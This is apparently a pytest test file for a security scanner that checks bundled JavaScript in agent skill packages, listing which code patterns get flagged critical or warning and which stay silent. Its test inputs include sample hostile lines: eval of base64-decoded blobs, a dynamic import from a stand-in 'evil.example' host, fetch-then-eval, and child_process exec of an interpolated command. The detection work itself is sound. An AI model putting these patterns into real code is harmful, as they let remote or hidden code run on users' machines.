"""Semantic pass over bundled JS/TS (.js/.ts/.mjs/.cjs) — the JS blind spot.

The taint/AST engine was Python+shell only; a JS payload (`eval(atob("…"))`,
`import("https://evil/x.js")`) had no semantic pass — only the raw content-ring
greps saw it. analyze_javascript adds a lexical, stdlib-only pass mirroring
analyze_shell, with a hybrid severity model:

  crit (-> B13 FAIL): eval/Function of a base64-decoded blob, and remote code
    fetched-then-executed (dynamic import of a URL, fetch(...).then(eval)).
  warn (-> B13 WARN): softer, often-legit signals — child_process exec with an
    interpolated command, dynamic require() of a non-literal.

Benign JS (static eval, JSON.parse(atob) of a token, local require, base64
decode without eval, documented examples in comments) stays silent.
"""
from __future__ import annotations

from pathlib import Path

from clawseccheck.catalog import FAIL, PASS
from clawseccheck.checks import vet_skill
from clawseccheck.skillast import analyze_javascript


def _rules(src: str, name: str = "index.js") -> list[str]:
    return [f.rule for f in analyze_javascript(src, name)]


def _sev(src: str, rule: str, name: str = "index.js") -> str:
    return next(f.severity for f in analyze_javascript(src, name) if f.rule == rule)


def _mk_skill(root: Path, files: dict) -> Path:
    root.mkdir(parents=True, exist_ok=True)
    (root / "SKILL.md").write_text("---\nname: s\ndescription: helper\n---\n# s\n", encoding="utf-8")
    for name, content in files.items():
        (root / name).write_text(content, encoding="utf-8")
    return root


# --------------------------------------------------------------------------- #
# crit — eval of a decoded blob / remote code fetched-then-executed            #
# --------------------------------------------------------------------------- #
def test_eval_atob_flags_crit():
    assert "JS_EVAL_DECODED" in _rules('eval(atob("cGF5bG9hZA=="));\n')
    assert _sev('eval(atob("x"));\n', "JS_EVAL_DECODED") == "crit"


def test_new_function_atob_flags():
    assert "JS_EVAL_DECODED" in _rules('const f = new Function(atob(payload)); f();\n')


def test_eval_buffer_base64_flags():
    assert "JS_EVAL_DECODED" in _rules('eval(Buffer.from(x, "base64").toString("utf8"));\n')


def test_dynamic_import_remote_flags():
    assert "JS_EVAL_REMOTE" in _rules('await import("https://evil.example/x.js");\n')


def test_fetch_then_eval_flags():
    assert "JS_EVAL_REMOTE" in _rules('fetch(u).then(r => r.text()).then(eval);\n')


def test_benign_static_eval_is_silent():
    assert _rules('eval("1 + 1");\n') == []


def test_benign_json_parse_atob_is_silent():
    # decoding a token to JSON is not code execution.
    assert _rules('const claims = JSON.parse(atob(jwt.split(".")[1]));\n') == []


def test_benign_local_import_is_silent():
    assert _rules('const u = await import("./util.js");\n') == []


def test_benign_base64_decode_no_eval_is_silent():
    assert _rules('const raw = Buffer.from(data, "base64");\n') == []


def test_benign_commented_eval_atob_is_silent():
    assert _rules('// eval(atob(x)) — do NOT do this\nconsole.log("ok");\n') == []


def test_benign_block_commented_eval_is_silent():
    assert _rules('/* eval(atob(x)) example */\nconsole.log("ok");\n') == []


# --------------------------------------------------------------------------- #
# warn — softer signals (often legit; never an automatic FAIL)                 #
# --------------------------------------------------------------------------- #
def test_child_process_template_flags_warn():
    src = 'const {exec} = require("child_process");\nexec(`git clone ${repo}`);\n'
    assert _sev(src, "JS_CHILD_PROCESS_DYNAMIC") == "warn"


def test_dynamic_require_variable_flags_warn():
    assert _sev('const m = require(modName);\n', "JS_DYNAMIC_REQUIRE") == "warn"


def test_process_dlopen_flags_warn():
    assert _sev('process.dlopen(module, "./build/x.node");\n', "JS_NATIVE_DLOPEN") == "warn"


def test_benign_native_require_is_silent():
    # requiring a native addon (the normal loader) is not a direct dlopen escape.
    assert _rules('const addon = require("./build/Release/addon.node");\n') == []
    assert _rules('const bindings = require("bindings")("addon");\n') == []


def test_benign_commented_dlopen_is_silent():
    # comment-masking: a documented mention must not fire (line + block).
    assert _rules('// process.dlopen(module, path) — internal only\nx();\n') == []
    assert _rules('/* uses process.dlopen() under the hood */\nx();\n') == []


def test_benign_static_exec_is_silent():
    src = 'const {exec} = require("child_process");\nexec("ls -la");\n'
    assert "JS_CHILD_PROCESS_DYNAMIC" not in _rules(src)


def test_benign_regex_exec_template_is_silent():
    # RegExp.prototype.exec against a template literal is not child_process.
    assert _rules('const m = re.exec(`${line}`);\n') == []


def test_benign_static_require_is_silent():
    assert _rules('const fs = require("fs");\nconst u = require("./util");\n') == []


# --------------------------------------------------------------------------- #
# Through vet_skill(): a bad bundled .js FAILs, a benign one PASSes.           #
# --------------------------------------------------------------------------- #
def test_vet_skill_with_js_eval_decoded_fails(tmp_path):
    d = _mk_skill(tmp_path / "evil", {"index.js": 'eval(atob("cGF5"));\n'})
    assert vet_skill(str(d)).status == FAIL


def test_vet_skill_with_benign_js_is_safe(tmp_path):
    d = _mk_skill(tmp_path / "ok", {"index.js": 'const fs = require("fs");\nconsole.log("hi");\n'})
    assert vet_skill(str(d)).status == PASS


def test_vet_skill_with_dlopen_js_is_warn_not_fail(tmp_path):
    # process.dlopen() is warn-only: it must surface, but must NEVER be a FAIL — even in
    # the installed-skill path, where a *crit* JS signal (e.g. JS_EVAL_DECODED) maps to a
    # B13 FAIL. This locks the "warn severity" choice that keeps it non-FAIL here.
    d = _mk_skill(tmp_path / "native", {"index.js": "process.dlopen(module, './x.node');\n"})
    assert vet_skill(str(d)).status != FAIL
